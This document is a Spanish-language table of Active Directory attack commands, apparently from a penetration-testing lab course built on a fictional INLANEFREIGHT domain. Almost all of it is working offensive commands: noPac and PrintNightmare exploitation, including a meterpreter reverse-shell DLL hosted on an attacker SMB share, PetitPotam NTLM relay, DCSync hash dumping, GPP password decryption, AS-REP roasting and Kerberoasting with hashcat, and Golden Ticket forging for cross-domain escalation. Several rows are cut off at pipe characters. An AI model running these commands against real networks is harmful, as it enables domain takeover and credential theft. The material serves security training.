|`sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`|Ejecuta `scanner.py` para verificar si un sistema objetivo es vulnerable a noPac/Sam_The_Admin desde un host basado en Linux.|
|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`|Utilizado para explotar la vulnerabilidad noPac/Sam_The_Admin y obtener una shell SYSTEM (`-shell`). Realizado desde un host basado en Linux.|
|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`|Utilizado para explotar la vulnerabilidad noPac/Sam_The_Admin y realizar un ataque DCSync contra la cuenta de Administrador integrada en un Controlador de Dominio desde un host basado en Linux.|
|`git clone https://github.com/cube0x0/CVE-2021-1675.git`|Utilizado para clonar un exploit PrintNightmare usando git desde un host basado en Linux.|
|`pip3 uninstall impacket` seguido de comandos de instalación de git|Utilizado para asegurar que la versión de Impacket del autor del exploit (cube0x0) esté instalada. Esto también desinstala cualquier versión previa de Impacket en un host basado en Linux.|
|`rpcdump.py @172.16.5.5|egrep 'MS-RPRN|
|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`|Utilizado para generar un payload DLL para ser usado por el exploit para obtener una sesión de shell. Realizado desde un host basado en Windows (nota: contexto sugiere host atacante, posiblemente Linux generando payload Windows).|
|`sudo smbserver.py smb2support CompData /path/to/backupscript.dll`|Utilizado para crear un servidor SMB y alojar una carpeta compartida (`CompData`) en la ubicación especificada en el host linux local. Esto se puede usar para alojar el payload DLL que el exploit intentará descargar al host objetivo. Realizado desde un host basado en Linux.|
|`sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'`|Ejecuta el exploit y especifica la ubicación del payload DLL. Realizado desde un host basado en Linux.|
|`sudo ntlmrelayx.py -debug -smb2support -target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Herramienta de Impacket utilizada para crear un relay NTLM especificando la URL de inscripción web para el host de la Autoridad de Certificación. Realizado desde un host basado en Linux.|
|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Utilizado para ejecutar el exploit PetitPotam especificando la dirección IP del host de ataque (172.16.5.255) y el Controlador de Dominio objetivo (172.16.5.5). Realizado desde un host basado en Linux.|
|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`|Usa `gettgtpkinit.py` para solicitar un ticket TGT para el Controlador de Dominio (`dc01.ccache`) desde un host basado en Linux.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Herramienta de Impacket utilizada para realizar un ataque DCSync y recuperar uno o todos los hashes de contraseña NTLM. Realizado desde un host basado en Linux.|
|`klist`|Comando utilizado para ver el contenido del archivo ccache. Realizado desde un host basado en Linux.|
|`python /opt/PKINITtools/getnthash.py -key <key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Utilizado para enviar solicitudes TGS usando `getnthash.py` desde un host basado en Linux.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes <hash>`|Herramienta de Impacket utilizada para extraer hashes de NTDS.dit usando un ataque DCSync y un hash capturado (`-hashes`). Realizado desde un host basado en Linux.|
|`.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64_cert> /ptt`|Usa Rubeus para solicitar un TGT y realizar un ataque pass-the-ticket usando la cuenta de máquina (`/user:ACADEMY-EA-DC01$`) de un objetivo Windows. Realizado desde un host basado en Windows.|
|`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`|Realiza un ataque DCSync usando Mimikatz. Realizado desde un host basado en Windows.|

### Configuraciones Erróneas Varias y GPOs

|**Comando**|**Descripción**|
|---|---|
|`Import-Module .\SecurityAssessment.ps1`|Utilizado para importar el módulo `SecurityAssessment.ps1`. Realizado desde un host basado en Windows.|
|`Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Herramienta basada en `SecurityAssessment.ps1` utilizada para enumerar un objetivo Windows para el bug de impresora MS-PRN. Realizado desde un host basado en Windows.|
|`adidnsdump -u inlanefreight\forend ldap://172.16.5.5`|Utilizado para resolver todos los registros en una zona DNS sobre LDAP desde un host basado en Linux.|
|`adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r`|Utilizado para resolver registros desconocidos en una zona DNS realizando una consulta A (`-r`) desde un host basado en Linux.|
|`Get-DomainUser|Select-Object samaccountname, description`|
|`Get-DomainUser -UACFilter PASSWD_NOTREQD|Select-Object samaccountname, useraccountcontrol`|
|`ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`|Utilizado para listar el contenido de un recurso compartido alojado en un objetivo Windows desde el contexto de un usuario actualmente conectado. Realizado desde un host basado en Windows.|
|`gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`|Herramienta utilizada para descifrar una contraseña de preferencia de política de grupo capturada desde un host basado en Linux.|
|`crackmapexec smb -L|grep gpp`|
|`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`|Localiza y recupera cualquier credencial almacenada en el recurso compartido sysvol de un objetivo Windows usando CrackMapExec desde un host basado en Linux.|
|`Get-DomainGPO|select displayname`|
|`Get-GPO -All|Select DisplayName`|
|`$sid = Convert-NameToSid "Domain Users"`|Crea una variable llamada `$sid` que se establece igual a la herramienta `Convert-NameToSid` y especifica la cuenta de grupo Domain Users. Realizado desde un host basado en Windows.|
|`Get-DomainGPO|Get-DomainObjectAcl|
|`Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`|Cmd-let de PowerShell utilizado para mostrar el nombre de un GPO dado un GUID. Realizado desde un host basado en Windows.|

### ASREPRoasting

|**Comando**|**Descripción**|
|---|---|
|`Get-DomainUser -PreauthNotRequired|select samaccountname, userprincipalname, useraccountcontrol|
|`.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`|Usa Rubeus para realizar un ataque ASREP Roasting y formatea la salida para Hashcat. Realizado desde un host basado en Windows.|
|`hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`|Usa Hashcat para intentar crackear el hash capturado usando una lista de palabras (`rockyou.txt`). Realizado desde un host basado en Linux.|
|`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`|Enumera usuarios en un dominio Windows objetivo y recupera automáticamente los hashes AS-REP para cualquier usuario encontrado que no requiera pre-autenticación Kerberos. Realizado desde un host basado en Linux.|

### Relaciones de Confianza (Trust Relationships)

|**Comando**|**Descripción**|
|---|---|
|`Import-Module activedirectory`|Utilizado para importar el módulo de Active Directory. Realizado desde un host basado en Windows.|
|`Get-ADTrust -Filter *`|Cmd-let de PowerShell utilizado para enumerar las relaciones de confianza de un dominio Windows objetivo. Realizado desde un host basado en Windows.|
|`Get-DomainTrust`|Herramienta de PowerView utilizada para enumerar las relaciones de confianza de un dominio Windows objetivo. Realizado desde un host basado en Windows.|
|`Get-DomainTrustMapping`|Herramienta de PowerView utilizada para realizar un mapeo de confianza de dominio desde un host basado en Windows.|
|`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL|select SamAccountName`|
|`mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`|Usa Mimikatz para obtener el Hash NT de la cuenta KRBTGT desde un host basado en Windows.|
|`Get-DomainSID`|Herramienta de PowerView utilizada para obtener el SID para un dominio hijo objetivo desde un host basado en Windows.|
|`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins"|select distinguishedname, objectsid`|
|`ls \\academy-ea-dc01.inlanefreight.local\c$`|Utilizado para intentar listar el contenido del disco C en un Controlador de Dominio objetivo. Realizado desde un host basado en Windows.|
|`mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<sid> /krbtgt:<hash> /sids:<sids> /ptt`|Usa Mimikatz para crear un Golden Ticket desde un host basado en Windows.|
|`.\Rubeus.exe golden /rc4:<hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<sid> /sids:<sids> /user:hacker /ptt`|Usa Rubeus para crear un Golden Ticket desde un host basado en Windows.|
|`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`|Usa Mimikatz para realizar un ataque DCSync desde un host basado en Windows.|
|`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`|Herramienta de Impacket utilizada para realizar un ataque DCSync desde un host basado en Linux.|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`|Herramienta de Impacket utilizada para realizar un ataque de fuerza bruta de SID desde un host basado en Linux.|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240|grep "Domain SID"`|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5|grep -B12 "Enterprise Admins"`|
|`ticketer.py -nthash <hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <sid> -extra-sid <sid> hacker`|Herramienta de Impacket utilizada para crear un Golden Ticket desde un host basado en Linux.|
|`export KRB5CCNAME=hacker.ccache`|Utilizado para establecer la Variable de Entorno `KRB5CCNAME` desde un host basado en Linux.|
|`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`|Herramienta de Impacket utilizada para establecer una sesión de shell con un Controlador de Dominio objetivo desde un host basado en Linux.|
|`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`|Herramienta de Impacket que realiza automáticamente un ataque que escala de dominio hijo a padre.|

### Relaciones de Confianza - Cross-Forest

|**Comando**|**Descripción**|
|---|---|
|`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL|select SamAccountName`|
|`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc|select samaccountname, memberof`|
|`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`|Usa Rubeus para realizar un Ataque de Kerberoasting contra un dominio Windows objetivo (`/domain:FREIGHTLOGISTICS.LOCAL`) desde un host basado en Windows.|
|`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`|Herramienta de PowerView utilizada para enumerar grupos con usuarios que no pertenecen al dominio desde un host basado en Windows.|
|`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`|Cmd-let de PowerShell utilizado para conectarse remotamente a un sistema Windows objetivo desde un host basado en Windows.|
|`GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`|Herramienta de Impacket utilizada para solicitar (`-request`) el ticket TGS de una cuenta en un dominio Windows objetivo (`-target-domain`) desde un host basado en Linux.|
|`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`|Ejecuta la implementación en Python de BloodHound contra un dominio Windows objetivo desde un host basado en Linux.|
|`zip -r ilfreight_bh.zip *.json`|Utilizado para comprimir múltiples archivos en 1 solo archivo .zip para ser subido a la GUI de BloodHound.|